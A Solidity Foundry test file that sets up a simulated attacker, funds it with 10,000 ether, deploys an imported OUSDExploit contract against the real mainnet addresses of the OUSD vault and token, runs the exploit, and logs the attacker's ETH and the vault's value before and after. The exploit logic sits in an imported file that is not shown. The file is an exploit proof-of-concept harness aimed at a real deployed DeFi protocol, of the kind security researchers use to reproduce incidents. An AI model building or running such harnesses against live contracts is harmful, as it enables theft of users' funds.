// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../exploit/OUSDExploit.sol";

contract TestOUSD is Test {
    address constant OUSD_VAULT = 0x277e80f3E14E7fB3fc40A9d6184088e0241034bD;
    address constant OUSD_TOKEN = 0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    OUSDExploit exploiter;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10000 ether);
    }

    function testOUSDExploit() public {
        vm.startPrank(attacker);

        exploiter = new OUSDExploit();
        payable(address(exploiter)).call{value: 6000 ether}("");

        console.log("=== Pre-exploit state ===");
        console.log("Vault totalValue:", IOUSDVault(OUSD_VAULT).totalValue() / 1e18);
        console.log("OUSD totalSupply:", IOUSD(OUSD_TOKEN).totalSupply() / 1e18);
        console.log("Attacker ETH:", attacker.balance / 1e18);

        exploiter.exploit();

        console.log("=== Post-exploit state ===");
        console.log("Attacker ETH:", attacker.balance / 1e18);
        console.log("Vault totalValue:", IOUSDVault(OUSD_VAULT).totalValue() / 1e18);

        vm.stopPrank();
    }
}
